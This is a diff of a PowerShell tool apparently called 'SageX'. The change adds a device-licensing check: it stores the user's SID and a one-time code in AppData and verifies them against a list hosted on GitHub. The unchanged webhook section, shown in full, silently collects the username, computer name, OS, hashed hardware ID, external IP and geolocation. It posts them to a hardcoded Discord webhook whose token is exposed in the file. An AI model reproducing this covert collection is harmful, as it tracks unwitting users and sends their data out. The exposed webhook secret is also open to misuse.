@@ -15,7 +15,7 @@ $asciiArt -split "`n" | ForEach-Object {
     Write-Host $_ -ForegroundColor $color
 }
 
-# Get current user's SID
+# Get SID
 try {
     $sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
     Write-Host "`n[*] Your SID: $sid" -ForegroundColor Yellow
@@ -24,11 +24,56 @@ try {
     exit
 }
 
-# ----------- WEBHOOK BLOCK BEGIN -----------
+# ---------- OTP BLOCK BEGIN ----------
+$otpFile = "$env:APPDATA\otp.ini"
+$otpGithubURL = "https://raw.githubusercontent.com/Toxic-Speed/SAG--X/main/otp_db.txt"
 
+# Create OTP if not exists
+if (-not (Test-Path $otpFile)) {
+    $otp = -join ((65..90) + (48..57) | Get-Random -Count 6 | ForEach-Object { [char]$_ })
+    New-Item -Path $otpFile -Force | Out-Null
+    Add-Content -Path $otpFile -Value "[OTP]"
+    Add-Content -Path $otpFile -Value "sid=$sid"
+    Add-Content -Path $otpFile -Value "otp=$otp"
+
+    # Prompt user
+    Write-Host "`n[!] OTP Verification Required" -ForegroundColor Yellow
+    Write-Host " > Please send this code to the developer or paste it manually in the database." -ForegroundColor Cyan
+    Write-Host "`n[!] OTP: $otp" -ForegroundColor Green
+    Write-Host "    URL: $otpGithubURL" -ForegroundColor Gray
+    Write-Host "`n[*] Exiting until verified..." -ForegroundColor Red
+    Start-Sleep -Seconds 5
+    exit
+}
+
+# Read local OTP
+$localOTP = Get-Content $otpFile | Where-Object { $_ -match '^otp=' } | ForEach-Object { ($_ -split '=')[1] }
+
+# Check GitHub list
+try {
+    $remoteData = Invoke-RestMethod -Uri $otpGithubURL -UseBasicParsing
+} catch {
+    Write-Host "`n[!] Could not fetch OTP database." -ForegroundColor Red
+    exit
+}
+
+# Validate
+if ($remoteData -notmatch "$sid:$localOTP") {
+    Write-Host "`n[!] Your device is not verified. Wait until developer adds the OTP." -ForegroundColor Red
+    Write-Host "[!] SID: $sid" -ForegroundColor Yellow
+    Write-Host "[!] OTP: $localOTP" -ForegroundColor Cyan
+    Start-Sleep -Seconds 5
+    exit
+}
+
+Write-Host "`n[+] OTP verified successfully!" -ForegroundColor Green
+# ---------- OTP BLOCK END ----------
+
+# ------------- Your Existing Code Starts Here (unchanged) -------------
+
+# ----------- WEBHOOK BLOCK BEGIN -----------
 $webhookUrl = "https://discord.com/api/webhooks/1375353706232414238/dMBMuwq29UaqujrlC1YPhh9-ygK-pX2mY5S7VHb4-WUrxWMPBB8YPVszTfubk-eVLrgN"
 
-# Collect system info
 $user = $env:USERNAME
 $pcName = $env:COMPUTERNAME
 $os = (Get-CimInstance Win32_OperatingSystem).Caption
@@ -36,7 +81,6 @@ $time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
 $hwid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
 $hashedHWID = [System.BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hwid))) -replace "-", ""
 
-# External IP and geo info
 try {
     $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json"
     $ip = $ipInfo.query
@@ -50,7 +94,6 @@ try {
     $city = "Unavailable"
 }
 
-# Create embed
 $embed = @{
     title = "<:Dead:1346705076626002033> SageX Executed"
     color = 16711680
@@ -72,14 +115,12 @@ $payload = @{
     embeds = @($embed)
 } | ConvertTo-Json -Depth 10
 
-# Send webhook
 try {
     Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
     Write-Host "[+] Webhook sent successfully." -ForegroundColor Green
 } catch {
     Write-Host "[!] Failed to send webhook." -ForegroundColor Red
 }
-
 # ----------- WEBHOOK BLOCK END -----------
 
 # Correct GitHub raw URL
